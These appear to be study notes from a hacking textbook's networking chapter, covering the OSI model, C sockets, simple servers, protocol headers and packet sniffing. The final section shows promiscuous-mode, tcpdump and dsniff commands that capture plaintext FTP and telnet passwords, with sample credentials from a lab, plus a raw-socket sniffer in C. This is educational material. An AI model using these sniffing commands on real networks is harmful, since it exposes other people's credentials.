@@ -1,0 +1,2168 @@
+NETWORKING
+
+OSI MODEL
+
+When two computers talk to each other, they need to speak the same language. 
+
+Structure of this language is described in layers by the OSI model. 
+
+OSI Model -> provides standards that allow hardware, such as routers and firewalls, to focus on one particular aspect of communication that applies to them and ignore others. 
+
+Broken down into conceptual layers of communication. This way routing and firewall hardware can focus on passing data at the lower layers, ignoring the higher layers of data encalsulation used by running applications. 
+
+7 OSI Layers:
+
+-Physical Layer -> this layer deals with the physical connection between two points. This is lowest layer, whose primary role is communicating raw bit streams. Layer is also responsible for activating, maintaining, and deactivating these bit-stream communications. 
+
+-Data-link Layer -> this layer deals with actually transferring data between two points. In contrast with the physical layer, which takes care of sending the raw bits, this layer provides high level functions, such as error correction and flow control. Also provides procedures for activating, maintaining, and deactivating data-link connections
+
+-Network Layer -> this layer works as a middle ground: its primary role is to pass information between the lower and higher layers. Provides addressing and routing
+
+-Transport Layer -> this layer provides transparent transfer of adata between systems. By providing reliable data communication, this layer allows the higher layers to never worry about reliability or cost-effectiveness of data transmission
+
+-Session Layer -> This layer is responsible for establishing and maintaining connectiong between network applications
+
+-Presentation Layer -> this layer is responsible for presenting the data to applications in a syntax or language they understand. Allows for things like encryption and data compression
+
+-Application Layer -> this laye ris concerned with keeping track of the requirements of the application
+
+packets -> data is sent in thse small pieces when communicated through these protocol layers. Each packets contains implementations of these protocol layers. 
+
+encapsulation -> Starting from the application layer, the packet wraps the presentation layer around that data, which wraps the session layer, which wraps the transport layer, and so forth. This process is called *encapsulation*. 
+
+Each wrapped layer contains a header and a body. 
+
+header -> contains the protocol information needed for that layer
+
+body -> contains the data for that layer. Body of one layer contains the entire package of previously encapsulated layers. Like the functional constructs found on a program's stack. 
+
+Example:
+
+When browsing the web, the Ethernet cable and card make up the physical layer, taking care of transmission of raw bits from one end of the cable to the other. The next layer is the data link layer. In the web browser example, Ethernet makes up this layer, which provides the low-level communications between Ethernet ports on the LAN. This protocol allows for communication between Ethernet ports, but these ports don't have IP addresses. 
+
+The concept of IP addresses doesn't exist until the next layer, the network layer. In addition to addressing, this layer is responsible for moving data from one address to another. 
+
+These three lower layers are able to send packets of data from one IP address to another.
+
+The next layer is the transport layer, which for web traffic is TCP; it provides a seamless bidirectional socket connection. 
+
+TCP/IP => describes the use of TCP on the transport layer and IP on the network layer. 
+
+Other addressing schemes exist at this layer; however, your web traffic probably uses IP version 4 (IPv4). 
+
+IPv4 addresses follow familiar form of xx.xx.xx.xx. 
+
+IPv6 (IP Version 6) also exists on this layer with a totally different addressing scheme. 
+
+Web traffic itself uses HTTP (Hypertext Transfer Protocol) to communicate, which is in the top layer of hte OSI model. 
+
+When you browse on Web, the web browser on your network is communicating across the Internet wit hthe webserver located on a different private network. When this happens, the data packets are encapsulated down to the physical layer where they are passed to a router. Since router isn't concerned with what's actually in the packets, it only needs to implement protocols up to the network layer. The router sends the packets out to the Internet where they reach the other network's router. This router then encapsulates this packet with the lower layer protocol headers needed for the packet to reach its final destination. 
+
+This packet encapsulation makes up a complex language that hosts on the Internet and other types of networks use to communicate with each other. 
+
+These protocols are programmed into routers, firewalls, and your computer's OS so they can communicate. 
+
+Programs that use networking such as web browsers and email clients need to interface with the OS which handles the network communications. Since OS takes care of details of network encapsulation, writing network programs is just a matter of using the network interface of the OS
+
+SOCKETS
+
+socket -> standard way to perform network communication through the OS. Can be thought of as an endpoint to a connection. Really just a programmer's abstraction that takes care of details of the OSI model. Can be used to send and receive data over a network. 
+
+Data is transmitted at the session layer (5), above the lower layers (handled by the OS), which take care of routing. 
+
+There are several types of sockets that determine the structure of the transport layer (4). Most common types are stream sockets and datagram sockets. 
+
+Stream socket -> provides reliable two-way communication. One side initiates connection to the other, and after the connection is established, either side can communicate to the other. Also there is immediate confirmation that what you said actually reached its destination. 
+
+Stream sockets use TCP (Tranmission Control Protocol) which exists on the transport layer (4). On computer networks data is usually transmitted in chunks called packets. TCP is designed so that the packets of data will arrive without errors and in sequence. Webservers, mail servers, and their respective client applications all use TCP and stream sockets to communicate. 
+
+Datagram socket -> more like mailing a letter. Conncetion is one-way and unreliable. Can't be sure what order data arrives or even if they reached their destination. 
+
+Datagram sockets use UDP (User Datagram Protocol) on the transport layer (4). Name implies it can be used to create custom protocols. This protocol is very basic and lightweight, with few safeguards built in. 
+
+More of a basic way to send data than a real connection. 
+
+Very little overhead in protocol, but protocol doesn't do much. If program needs to confirm that a packet was received by the other side, the other side must be coded to send back an acknowledgment packet. In some cases, packet loss is acceptable. 
+
+Datagram sockets and UDP are commonly used in networked games and streaming media, since developers can tailor their communications exactly as needed without the built-in overhead of TCP. 
+
+SOCKET FUNCTIONS
+
+In C, sockets behave a lot like files since they use file descriptors to identify themselves. 
+
+You can actually use read() and write() to receive and send data using socket file descriptors. 
+
+However, there are several functions designed for dealing with sockets. 
+
+Most defined in /usr/include/sys/sockets.h
+
+socket(int domain, int type, int protocol) -> Used to create a new socket, returns a file descriptor for the socket or -1 on error
+
+connect(int fd, struct sockaddr *remote_host, socklen_t addr_length) -> connects to a socket (described by file descriptor fd) to a remote host. Returns 0 on success and -1 on error 
+
+bind(int fd, struct sockaddr *local_addr, socklen_t addr_length) -> binds a socket to a local address so it can listen for incoming connections. Returns 0 on success and -1 on error. 
+
+listen(int fd, int backlog_queue_size) -> listens for incoming connections and queues connection requests up to backlog_queue_size. Returns 0 on success and -1 on error
+
+accept(int fd, sockaddr *remote_host, socklen_t *addr_length) -> accepts an incoming connection on a bound socket. The address information from the remote hose is written into the remote_host structure and the actual size of the address structure is written into *addr_length. This function returns a new socket file descirptor to identify the connected socket or -1 on error. 
+
+send(int fd, void *buffer, size_t n, int flags) -> Sends n bytes from *buffer to socket fdl returns the number of bytes sent or -1 on error
+
+recv(int fd, void *buffer, size_t n, int flags) -> receive n bytes from socket fd into *buffer, returns the number of bytes received or -1 on error
+
+When a socket is created, the domain, type, and protocol of te socket must be specified.
+
+Domain -> refers to the protocol family of the soket. 
+
+Socket can be used to communicate using a variety of protocols, from standard Internet protocol used when browing the web to amateur radio protocols such as AX.25. 
+
+Protocol families are defined in bits/socket.h which is automatically included from sys/socket.h
+
+PF_INET
+PF_INET6
+...
+
+Types of sockets are also defined in bits/socket.h
+
+SOCK_STREAM
+SOCK_DGRAM
+
+Final argument for socket() is the protocol, which should almost always be 0. The specification allows for multiple protocols within a protocol family, so this argument is used to select one of the protocols from the family. 
+
+In practice, however, most protocol families only have one protocol, which means this should usually be set for 0, the first and only protocol in the enumeration of the family. 
+
+SOCKET ADDRESSES
+
+sockaddr -> structure to pass address information that defines a host. 
+
+Also defined in bits/socket.h
+
+/* Get the definition of the macro to define the common sockaddr members.
+#include <bits/sockaddr.h>
+/* Structure describing a generic socket address. */
+struct sockaddr
+{
+__SOCKADDR_COMMON (sa_); /* Common data: address family and length.
+char sa_data[14];
+/* Address data. */
+};
+
+The macro for SOCKADDR_COMMON is defined in the included bits/sockaddr.h file, which basically translates to an unsigned short int. This value defines the address family of the address, and the rest of the structure is saved for address data. 
+
+Since sockets can communicate using a variety of protocol families, each with their own way of defininf endpoint addresse, the definition of an address must also be variable, depending on the address family. 
+
+The possible address families are also defined in bits/socket.h. They usually translate directly to corresponding protocol families
+
+AF_INET
+AF_INET6
+...
+
+Since an address can contain different types of information, depending on the address family, there are several other address structure that contain, in the address data section, comon elements from the sockaddr structure as well as information specific to the address family. 
+
+These structures are also the same size so they can be typecast to and from each other. 
+
+Means that a socket() function will simply accept a pointer to a sockaddr structure, which can in fact point to an address structure for IPv4, IPv6, or X.25
+
+Allows socket functions to operate on a variety of protocols
+
+This book deals with IPv4, which is protocol family PF_INET, using address family AF_INET
+
+The parallel socket address structure for AF_INET is defined in the netinet/in.h file
+
+// Structure describing an Internet socket address
+struct sockaddr_in
+{
+__SOCKADDR_COMMON (sin_);
+in_port_t sin_port;
+/* Port number. */
+struct in_addr sin_addr;
+/* Internet address. */
+/* Pad to size of 'struct sockaddr'. */
+unsigned char sin_zero[sizeof (struct sockaddr) -
+__SOCKADDR_COMMON_SIZE -
+sizeof (in_port_t) -
+sizeof (struct in_addr)];
+};
+
+The SOCKADDR_COMMON part at top of structure is simply the unsigned short int mentione dabove, which is used to define the address fmaily. 
+
+Since socket endpoint address consists of an Internet address ad a port number, these are the next two values in the structure.
+
+The port number is a 16 bit short, while the in_addr structure used for the Internet address contains a 32 bit number. 
+
+Rest of the structure i sjust 8 bytes of padding to fill out the rest of the sockaddr structure. Space isn't used for anything, but must be saved so the structures can be interchangeably typecast. 
+
+sockaddr structure (generic)
+--|---------------|
+Family | sa_data [14]
+
+sockaddr_in structure (IPv4)
+--|--|----|--------|
+Family | Port # | IP Address | Extra Padding (8 bytes)
+
+NETWORK BYTE ORDER
+
+Port number and IP address used in the AF_INET socket address structure are expected to follow the network byte ordering, which is big endian. 
+
+This is opposite of x86 little-endian ordering so these values must be converted
+
+Several functions specifically for these conversions, whose prototypes are defined in:
+
+netinet/in.h and arpa/inet.h include files
+
+htonl(long value) -> Host-to-Network_long -> converts a 32 bit int from the host's byte order to network byte order
+
+htons(short value) -> Host-To-Network-Short -> converts a 16bit int from the host's byte order to network byte order
+
+ntohl(long value) -> Network-To-Host_long -> converts a 32 bit integer from network byte order to the host's byte order
+
+ntohs(long value) -> Network-To_Host-Short -> conerts a 16 bit int from network-byte order to host's byte order
+
+For compatability with all architectures, these conversion functions should still be used even if the host is using a processor with big-endian byte ordering. 
+
+INTERNET ADDRESS CONVERSION
+
+IP Address -> 12.110.110.204
+
+There are function to convert this notation to and from a 32 bit integer in network byte order. 
+
+inet_aton(char *ascii_addr, struct in_addr *network_addr) -> ASCII to Network -> This function converts an ASCII string containing an IP address in dotted number format into an in_addr structure
+
+inter_ntoa(struct in_addr *network_addr) -> Network to ASCII -> this function converts the other way. it is passed a pointer to an in_addr structure containing an IP address, and the function retrusn a character pointer to an ASCII string containing the IP address in dotted-number format. String is held in a statically allocated memory buffer in the function, so it can be accessed until the next call to inet_ntoa(), when the string will be overwritten. 
+
+A SIMPLE SERVER
+
+Following server code listens for TCP connections on port 7890. When a client connects, it sends the message Hello, world! and then receives data until the connection is clased. 
+
+hacking.h has a memory dump function used to display packet data by the server program. 
+
+To set TCP socket for IPv4 protocol, we call socket(), setting protocol to PF_INET, socket type to SOCK_STREAM, and final argument is 0 since there is only one protocol in the PF_INET protocol family. Returns a socket file descriptor sockfd
+
+setsockopt() -> function to set socket options. Sets the SO_REUSEADDR socket option to true, which will allow it to reuse a given address for binding. Without this option set, when the program tries to bind to a given port, it will fail if that port is already in use. 
+
+If a socket isn't closed properly, it may appear to be in use, so this option lets a socket bind to a port (and take over control of it), even if it seems to be in use. 
+
+First argument is the socket file descriptor, second specifies the level of the option, and third specifies the option itself.
+
+Since SO_REUSEADDR is a socket-level option, the level is set to SOL_SOCKET. 
+
+Many different socket options defined in /usr/include/asm/socket.h
+
+The final two arguments are a pointer to the data that the option should be set to and the length of that data. A pointer to data and the length of that data are two arguments that are often used with socket functions.
+
+Allows functions to handle all sorts of data, from single bytes to large data structures. 
+
+The SO_REUSEADDR options uses a 32bit int for its value, so to set this option to true, the final two arguments mus tbe a pointer to the integer value of 1 and the size of an integer (which is 4 bytes). 
+
+Next few lines set up the host_addr structure for use in the bind call. 
+
+The address family is AF_INET, since we are using IPv4 and the sockaddr_in structure. The port is set to PORT which is defined as 7890. This short integer value must be converted into network byte order, so the htons() functoin is used. Address is set to 0, which means it will automaticaly be filled with the host's current IP adress. Since the value 0 is the same regardlress of byte order, no conversion is necessary. 
+
+The bind() call passes the socket file descriptor, the address structure, and the length of the address structure. Call binds the socket to current IP address on port 7890. 
+
+The listen() call tells the socket to listen for incoming connections, and the subsequent accept() call actually accepts an incoming connection. The listen() function places all incoming connections into a backlog queue until an accept() call accepts the connections. The last argument to listen() sets the max size for the backlog queue
+
+Next is a loop that accepts incoming connections. 
+
+Final argument of accept() function is size of the address structure. This is because the accept() function will write the connecting client's address information into the address structure and the size of that structure into sin_size. 
+
+For our purposes, the size never changes but to use the function, we must obey the calling convention. 
+
+The accept() function returns a new socket file desciprtor for the accepted connection. This way, the original socket file descriptor can continue to be used for accepting new connections, while the new socket file descirptor is used for communicating with the connected client. 
+
+After getting a connection, the program prints out a connection message, using inet_ntoa() to convert the sin_addr address structure to a dotted number IP string and ntohs() to convert the byte order of the sin_port number. 
+
+The send() function sends the 13 bytes of the string Hello, world!\n to the new socket that describes the new connection. The final argument for the send() and recv() functions are flags, that for our purposes will always be 0.
+
+Next is a loop that receives data from the connection and prints it out. 
+
+The recv() function is given a pointer to a buffer and a max length to read from the socket. The function writes the data into the buffer passed to it and return the number of bytes it actually wrote. The loop will continue as long as recv() call continues to receive data. 
+
+When compiled and run, the program binds to port 7890 of the host and waits for incoming connections
+
+A telnet client basically works like a generic TCP connection client so it can be used to connect to the simple server by specifying the target IP address and port
+
+telnet 192.168.42.248 7890
+
+A WEB CLIENT EXAMPLE
+
+The telnet program works well as a client for our server. So there really isn't much reason to write a specialized client. 
+
+However, there are thousands of different types of servers that accept standard TCP/IP connections. 
+
+Web browser makes connections with webservers. Connection transmits the web page over the connection using HTTP, which defines a certain way to request and send information. 
+
+By default, webservers run on port 80, which is listed along with many other default ports in /etc/services
+
+HTTP exists in the application layer -- the top layer -- of the OSI model.
+
+At this layer, all of the networking details have already been taken care of by the lower layers, so HTTP uses plaintext for its structure. 
+
+Many other application layer protocols also use plaintext, such as POP3, SMTP, IMAP, and FTP's control channel. 
+
+Since these are standard protocols, they are well documented and easily researched. Once you know the syntax of these various protocols, you can manually talk to other programs that speak the same language. 
+
+HTTP
+
+Requests made using command GET followed by the resource path and the HTTP protocol version. 
+
+GET / HTTP/1.0 -> requests the root document from the webserver using HTTP version 1.0. 
+
+Request is actually for the root directory of /, but most webservers will automatically search for a default HTML document in that directory of index.html. If server finds the resource, it will respond using HTTP by sending several headers before sending the content. 
+
+If the command HEAD is used instead of GET, it will only return the HTTP headers without the content. These headers are plaintext and can usually provide information about the server. 
+
+Headers can be retrieved manually using telnet by connecting to port 80 of a known website then typing HEAD / HTTP/1.0 and pressing ENTER twice
+
+telnet www.google.com 80
+
+HEAD / HTTP/1.0
+
+reader@hacking:~/booksrc $ telnet www.internic.net 80
+Trying 208.77.188.101...
+Connected to www.internic.net.
+Escape character is '^]'.
+HEAD / HTTP/1.0
+HTTP/1.1 200 OK
+Date: Fri, 14 Sep 2007 05:34:14 GMT
+Server: Apache/2.0.52 (CentOS)
+Accept-Ranges: bytes
+Content-Length: 6743
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Connection closed by foreign host.
+reader@hacking:~/booksrc $
+
+Reveals webserver is Apache v.2.0.52 and eve nthat the host runs CentOS. 
+
+Useful info, so can write a pogram that automates this process
+
+Book programs use new functions located in hacking-network.h to send and recv information on a socket. Called send_string() and recv_line(). 
+
+The normal send() functoin returns the number of bytes written, which isn't always equal to the number of bytes you tried to send. The send_strin() functoin accepts a socket, and a string pointer as arguments and makes sure the entire string is sent out over the socket. Uses strlen() to figure out total length of the string passed to it. 
+
+May have noticed that every packet the simple server received, ended with the bytes 0x0D and 0x0A. This is how telnet terminates the lines -> it sends a carriage return and a newline character. 
+
+HTTP protocol also expects lines to be terminated with these two bytes. 
+
+0x0D -> \r, carriage return
+0x0A -> \n, newline
+
+The recv_line() function reads entire lines of data. It reads fro mthe socket passed as the first argument into a buffer that the second argument points to. It continues receiving from the socket until it encounters the last two line-termination bytes in sequence. Then it terminates the string and exits the function. These new functions ensure that all bytes are sent and receive data as lines terminated '\r\n'. 
+
+Making a socket connection to a numerical IP address is simple, but named addresses are commonly used for convenience. 
+
+In manual HTTP HEAD request, the telnet program automatically does a DNS (Domain Name Service) lookup to determine that www.iternic.net translate to the IP address 192.0.34.151. 
+
+DNS -> protocol that allows an IP address to be looked up by a named address, similar to how a phone number cna be looked up in a phone book. 
+
+Naturally, there are socket-related functions and structures specifically for hostname lookup svia DNS. 
+
+These functions anre structures are defined in netdb.h
+
+gethostbyname() -> takes a pointer to a string containing a named address and returns a pointer to a hostent structure or NULL pointer on error. The hostent structure is filled with information from the lookup, including the numerical IP address as a 32 bit int in network byte order. 
+
+Similar to the inet_ntoa() function, the memory for this structure is statically allocated in the function. 
+
+Also demonstrate this function in host_lookup.
+
+/* Description of database entry for a single host. */
+struct hostent
+{
+char *h_name;
+/* Official name of host. */
+char **h_aliases;
+/* Alias list. */
+int h_addrtype;
+/* Host address type. */
+int h_length;
+/* Length of address. */
+char **h_addr_list;
+/* List of addresses from name server. */
+#define h_addr h_addr_list[0] /* Address, for backward compatibility.
+};
+
+Can also create a webserver_id.c function to identify a webserver.
+
+strncasecmp() -> sring comparison function from strings.h which compares the first n bytes of two strings, ignoring capitalization. First two arguments are pointer to the strings, and third argument is n the number of bytes to compare. 
+
+Gets the server of a web address
+
+A TINY WEB SERVER
+
+A webserver doesn't have to be much more complex than the simple server. 
+
+After accepting a TCP-IP connection, the webserver needs to implement further layers of communicatoin using the HTTP protocol. 
+
+The server code in tinyweb.c is nearly identical to the simple server, except that connections handling code is separated into its own function.
+
+This function handles HTTP GET and HEAD requests that would come from a web browser. 
+
+The program will look for the requested resource in the local directory called webroot and send it to the browser. If the file can't be found, the server will respond with a 404 HTTP response. Means File Not Found. 
+
+The handle_connectoin function uses the strstr() function to look for the substring HTTP/ in the request buffer. The strstr() function returns a pointer to the substring, which will be right at the end of the request. The string is terminated here and the requests HEAD and GET are recorgnized as processable requests. A HEAD request will just return the headers, while a GET request will also retur nthe requested resource (if it can be found). 
+
+The files index.html and image.jpg have been put in the directory webroot, shown in output below, and then the tinyweb program is compiled. Root privileges are needed to bind to any port below 1024, so the program is setuid root and exeecuted. 
+
+The server's debugging output shows the results of a web browser's request of http://127.0.01:
+
+reader@hacking:~/booksrc $ ls -l webroot/
+total 52
+-rwxr--r-- 1 reader reader 46794 2007-05-28 23:43 image.jpg
+-rw-r--r-- 1 reader reader
+261 2007-05-28 23:42 index.html
+reader@hacking:~/booksrc $ cat webroot/index.html
+<html>
+<head><title>A sample webpage</title></head>
+<body bgcolor="#000000" text="#ffffffff">
+<center>
+<h1>This is a sample webpage</h1>
+...and here is some sample text<br>
+<br>
+..and even a sample image:<br>
+<img src="image.jpg"><br>
+</center>
+</body>
+</html>
+reader@hacking:~/booksrc $ gcc -o tinyweb tinyweb.c
+reader@hacking:~/booksrc $ sudo chown root ./tinyweb
+reader@hacking:~/booksrc $ sudo chmod u+s ./tinyweb
+reader@hacking:~/booksrc $ ./tinyweb
+Accepting web requests on port 80
+Got request from 127.0.0.1:52996 "GET / HTTP/1.1"
+Opening './webroot/index.html'
+200 OK
+Got request from 127.0.0.1:52997 "GET /image.jpg HTTP/1.1"
+Opening './webroot/image.jpg'
+200 OK
+Got request from 127.0.0.1:52998 "GET /favicon.ico HTTP/1.1"
+Opening './webroot/favicon.ico' 404 Not Found
+
+The address 127.0.0.1 is a special loopback address that routes to the local machine. 
+
+Initial request gets index.html from webserver, which in turn requests image.jpg. In addition, browser automatically requets favicon.ico in an attempt to retrieve an icon for the web page. 
+
+PULLING BACK THE LOWER LAYERS
+
+When you use a web browser, all seven OSI layers are taken care of for you; allowing you to focus on browsing and not protocols. 
+
+Upper levels of OSI can be plaintext since all the other details of the connections are already taken care of by the lower layers. 
+
+Sockets exist on the session layer (5), providing an interface to send data from one host to another. 
+
+TCP on the transport layer (4), provides reliability and transport control
+
+IP on the network layer (3) provides addressing and packet-level communication. 
+
+Ethernet on the data link layer (2) provides addressing between Ethernet ports, suitable for basic LAN (Local Area Network) communications
+
+The wire and protocol used to snd bits from one device to another is the physical layer (1). 
+
+A single HTTP message will be wrappedin multiple layers as it is passed through different aspects of communication. 
+
+Think of process as intricate interoffice bureacracy.
+
+At each layer, highly specialized receptionist who only understands language and protocol of that layer. 
+
+As data packets are transmitted, each receptionist performs the necessary duties of her particular layer, puts the packet in an interoffice enveloper, write the header on the outside, and passes it on to the receptionist at the next layer below. 
+
+Network traffic is a chattering bureaucracy of servers, clients, and peer-to-peer connections.
+
+At higher layers, the traffic could be financial data, email, or basically anything.
+
+Regardless of what the packets contain, the protocols used at the lower layers to move the data from point A to point B are usually the same. 
+
+Once you understand how these layers work, you can peek inside envelopes in transit and even falsify documents to manipulate the system
+
+DATA LINK LAYER
+
+Data-Link Layer -> the lowest visible layer. Provides a way to address and send messages to anyone else in the office, as well as figure out who is in the office
+
+Ethernet exists on this layer, provididng a standard addressing system for all Ethernet devices.
+
+MAC (Media Access Control) addresses -> every Ethernet device is assigned a globally unique address consisting of 6 bytes, usually written in hex xx:xx:xx:xx:xx:xx. Sometimes referred to as hardware addresses, since each address is unique to a piece of hardware and is stored in device's integrated circuit memoery. 
+
+An Ethernet header is 14 bytes in size and contains the source and destination MAC addresses for this Ethernet packet. 
+
+Ethernet addressing also provides a special broadcast address, consisting of all binary 1s (ff:ff:ff:ff:ff:ff).
+
+Any Ethernet packet sent to this address will be sent to all connected devices. 
+
+The MAC address of a network device isn't meant to change, but its IP address may change regularly. 
+
+The concept of IP addresses doesn't exist at this level, only hardware addresses do, so a method is needed to correleate the two addressing schemes. 
+
+In Ethernet, this method is known as ARP (Address Resolution Protocol). 
+
+ARP -> allows charts to be madet oassociate an IP address with a piece of hardware. There are four different types of ARP messages, but the two most important types are:
+1. ARP request messages
+2. ARP reply messages
+
+Any packet's Ethernet header includes a type value that describes the packet. This type is used to specify whether the packet is an ARP type message or an IP packet. 
+
+ARP Request -> message sent to the broadcast address, that contains the sender's IP address and MAC address nad basically says "Hey who has this IP? If it's you, please respond and tell me your MAC address." 
+
+ARP Reply -> the corresponding response that is sent to the requester's MAC address (and IP address) saying "This is my MAC address and I have this IP address". 
+
+Most implementations will temporarily cache the MAC/P address pairs received in ARP replies, so that ARP requests and replies aren't needed for every single packet. 
+
+If system wants to establish a TCP connection over IP to a second device's IP address on the same network, the first sytem will first check its ARP cache to see if any entry exists for 10.10.10.50. Since this is the first tim ethse two systems are trying to communicate, there will be no such entry, and an ARP request will be sent out to the broadcast address saying, "If you are 10.10.10.50, please respond to me at 00:00:00:aa:aa:aa". 
+
+Since this request uses the broadcast address, every system on the network sees the request, but only the system with the corresponding IP address is meant to respond. 
+
+The second system responds with an ARP reply that is sent to the first systems's MAC address. 
+
+The first system receives this reply, caaches the IP and MAC address pair in its ARP cache, and uses the hardwre address to communicate. 
+
+NETWORK LAYER
+
+Like a worldwide postal service providing an addressing and delivery method used to send things everywhere. 
+
+IP (Internet Protocol) -> Protocol used at this layer for Internet addressing and delivery
+
+IPv4 most popular. 
+
+Every system on the Internet has an IP address, consisting of a 4byte arrangement in for xx.xx.xx.xx. 
+
+The IP header for packets in this layer is 20 bytes in size and consists of various fields and bit flags defined in RFC 791.
+
+
+Very dscriptive ASCII diagram in this shows these fields and their positoins in the header. 
+
+Similar to Ethernet header, the IP header also has a protocol field to describe the type of data in the packet and the source and destination addresses for routing. In addition, the header carries a checksum, to help dettect transmission errors, and fields to deal with packet fragmentatio.
+
+IP mostly used to transmit packets wrappedin higher layers.
+
+However, Internet Control Message Protocol (ICMP) packets also exist on this layer. Used for messaging and diagnostics. No guarantee IP message will reach its destination. If there's a problem, an ICMP packet is sent back to notify sender. Also used commonly to test for connectivity. ICMP Echo Request and ICMP Echo Reply messages are used by *ping*
+
+ping -> uses ICMP. Can be used for one host to test whether it can route traffic to another host. Can be used to determine connection latency beween two hosts. 
+
+IMPORTANT: ICMP and IP are both connectionless; all this protocol layer really cares about is getting the packet to its destination address.
+
+Sometimes a network link will have a limitation on packet isze, disallowing the transfer of large packets. 
+
+IP can deal with this by fragmenting packets
+
+Packet is broken up into smaller packet fragments that can pass through network link. IP headers are put on each fragment, and they are sent off. Each fragment has a different fragment offset value, which is stored in the header. When destination receives these fragments, the offset values are used to reasemble the original IP packet. 
+
+TRANSPORT LAYER
+
+Maintains connections and ensures delivery. 
+
+TCP/UDP most common. 
+
+TCP is most commonly used protocol for services on the Internet: telnet, HTTP (web traffic), SMTP (email traffic), and FTP (file transfers) all use TCP. 
+
+Popular because it provides a transparent yet reliable and bidirectoinal, connection between two IP addresses. Use stream sockets. Reliable because TCP wil ensure that all the data will reach its destination in th eproper order. If they arrive jumbled, TCP will make sure they're put back in order before handing the data up to the next layer. If some packets in the middle are lost, the destination will hold on to the packets it has while hte source retransmits the missing packets.
+
+This functionality is made possible by a set of flags: TCP flags and by tracking values called *sequence numbers*. 
+
+TCP Flags:
+
+TCP FLag	Meaning			Purpose
+URG 		Urgent 			Identifies important data
+ACK 		Acknowledgment 	Acknowledges a packet; it is turned on for the majority of the connection
+PSH 		Push 			Tells the receiver to push the data through instead of buffering it
+RST			Reset 			Resets a connection
+SYN 		Synchronize 	Synchronizes sequence numbers at the beginning of a connection
+FIN 		Finish 			Gracefully closes a connection when both sides say goodbye
+
+These flags are stored in the TCP header along with the source and destination ports. 
+
+TCP header specified in RFC 793
+
+Sequence number and acknowledgement number are used to maintain state. 
+
+The SYN and ACK flags are used together to open connections in a three-step handshaking process. 
+
+When client wants to open a connection with a server, a packet with the SYN flag on, but the ACK flag off, is sent to the server. The server then responds with a packet that has both the SYN and ACK flags turned on. To complete the connection, the client sends back a packet with the SYN flag off but the ACK flag on. After that, every packet in the connection will have the ACK flag turned on and the SYN flag turned off. 
+
+Only the first two packets of the connectoin have the SYN flag on, since those packets are used to synchronize sequence numbers 
+
+The first packet sends a sequence
+
+Sequence numbers allow TCP to put unordered packets back into order, to determine whether packets are missing, and to prevent mixing up packets from other connections. 
+
+When a connection is initiated, each side generates an initial sequence number. This number is communicated to the other side in the first two SYN packets of the connection handshake. Then with each packet that is sent, the sequence number is incremented by the number of bytes found in the data portion of the packet. 
+
+This sequence number is included in the TCP packet header. 
+
+In addition, each TCP header has its own acknowledgement number, which is simply the other side's sequence number plus one. 
+
+TCP is great for applications where reliability and bidirectional communication are needed. 
+
+Cost of this functionality i spaid in communication overhead.
+
+UDP has less overhead and less functionality. Is connectionless and unreliable. Sometimes this is better.
+
+UDP header is defined in RFC 768 and relatively tiny. Contains four 16bit values in this order:
+source port, destination port, length, and checksum
+
+NETWORK SNIFFING
+
+There is distinction between switched and unswitched networks.
+
+unswitched network -> Ethernet packets pass through every device on network, expectin each system devices to only look at the packets sent to its destination address. 
+
+Fairly simple to set a device to *promiscuous mode*
+
+Promiscuous mode -> device looks at all packets regardless of destination address
+
+Most packet-capturing programs, such as tcpdump, drop device they are listening to into promiscuous mode by default. 
+
+Can be ste using ifconfig
+
+sudo ifconfig eth0 promisc
+
+Sniffing -> the act of capturing packets that aren't necessarily meant for public viewing. 
+
+Sniffing packets in promiscuous mode on an unswitched network can turn up all sorts of useful information. 
+
+sudo tcpdump -l -X 'ip host 192.168.0.118'
+
+Data transmittted over network by services such as telnet, FTP, and POP3 is unencrypted. 
+
+In book, user leech is seen logging into an FTP server using password 18@nite
+
+Sinc ethe authorization process during login is also unencrypted, usernames and passwords are simple contained in the data protions of the transmitted packets
+
+tcpdump -> general purpose packet sniffer, but also specialized sniffing tools designed specifically to search for usernames and passwords
+
+dsniff -> Dug Song's which is smart enought to parse out data that looks importatnt
+
+sudo dsniff -n
+
+reader@hacking:~/booksrc $ sudo dsniff -n
+dsniff: listening on eth0
+-----------------
+12/10/02 21:43:21 tcp 192.168.0.193.32782 -> 192.168.0.118.21 (ftp)
+USER leech
+PASS l8@nite
+-----------------
+12/10/02 21:47:49 tcp 192.168.0.193.32785 -> 192.168.0.120.23 (telnet)
+USER root
+PASS 5eCr3t
+
+RAW SOCKET SNIFFER
+
+Stream sockets, when sending and receiving, the data is neatly wrapped in a TCP/IP connection. accessing the OSI model of session layer, the OS takes care of all the lower-level details of transmission, correction, and routing
+
+Possible to access the network at lower layers using raw sockets. 
+
+At this lower layer, al deatils are exposed and must be handled explicitly by the programmer.
+
+Raw sockets specified by SOCK_RAW tpe. In this case, protocol matters since there are multiple options. Protocol can be IPPROTO_TCP, IPPROTO_UDP, or IPPROTO_ICMP.
+
+Example:
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#include "hacking.h"
+int main(void) {
+int i, recv_length, sockfd;
+u_char buffer[9000];
+if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+fatal("in socket");
+for(i=0; i < 3; i++) {
+recv_length = recv(sockfd, buffer, 8000, 0);
+printf("Got a %d byte packet\n", recv_length);
+dump(buffer, recv_length);
+}
+}
+
+This opens a raw TCP socket and listens for three packets, printing the raw data of each one with the dump() function. 
+
+uchar is located in sys/socket.h because unsigned variables are used often in network programming
+
+When compiled, program needs to be run as root, because use of RAW sockets requires root access
+
+Output on pg. 227
+
+While this program will capture packets, it isn't reliable and will miss some packets, especially when there is a lot of traffic. Also it only captures TCP packets - to capture UDP or ICMP packets, addition raw sockets need to be opened for each. 
+
+Another program is that raw sockets are notoriously inconsistent between systems. Raw socket code for Linux most likely won't work on BSD or Solaris. This makes multiplatform programming with raw_sockets nearly impossible.
+
+libpcap SNIFFER
+
+libpcap -> standardized programming library can be used to smooth out inconsistencies of raw sockets. 
+
+Functions in this library still use raw sockets, but the library knows how to correctly work with raw sockets on multiple architectures. 
+
+Both tcpdump and dsniff use libpcap, which allows them to compile with relative ease on any platform. 
+
+Example with libpcap functions
+
+pcan_sniff.c
+
+pcap.h -> include file. Provides various structures and defines used by pcap functions. 
+
+The errbuf variable is error buffer, its size coming from a define in pcap.h set to 256. 
+
+Header variable is a pcap_pkthdr structure containing extra capture information about the packet, such as when it was captured and its length. 
+
+The pcap_handle pointer works similarly to a file descriptor but is used to reference a packet capturing object. 
+
